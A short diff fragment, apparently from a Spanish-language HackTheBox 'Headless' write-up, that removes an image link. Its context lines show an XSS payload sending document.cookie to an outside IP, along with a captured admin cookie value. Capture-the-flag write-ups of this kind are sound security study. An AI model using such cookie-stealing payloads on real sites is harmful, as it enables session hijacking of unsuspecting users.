@@ -52,7 +52,7 @@ Después de probar con algunos xss decido probar por otro lado a ver si funciona
 <img src=x onerror=fetch('http://10.10.14.168/?cpplie='+document.cookie);>
 ```
 
-![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/269a605b-c54e-4c09-bfe0-872aee33c8ed)
+
 
 cookie: "ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"
 
